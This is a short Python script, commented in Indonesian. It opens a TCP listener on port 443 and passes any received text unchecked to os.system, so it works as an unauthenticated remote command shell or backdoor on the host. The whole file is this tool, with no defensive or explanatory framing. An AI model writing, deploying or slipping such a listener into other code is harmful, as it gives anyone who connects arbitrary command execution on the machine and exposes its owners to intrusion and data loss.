import socket
from threading import Thread
import os

spab = (lambda x: [print(' ') for i in range(x)])

def listen():
 global server
 global ip
 global port
 ip = '192.168.100.3'
 port = 443
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((ip, port))
 server.listen()


 
def handle(client_sock):
 global permintaan
 permintaan = str(client_sock.recv(1024))
 print('perintah: %s' %(permintaan))
 client_sock.send(b'running command...')
 print(type(permintaan))
 permintaan = permintaan.strip('b')
 os.system(str("%s" %(permintaan)))
 #if permintaan not in availl:
 # client_sock.send(b'\ncommand not found')
 client_sock.close()


listen()

while True:
 #oke
 client, addr = server.accept()
 print('dapet koneksi dari %s:%d' %(addr[0], addr[1]))
 loop = Thread(target=handle, args=(client,))
 loop.start()
 
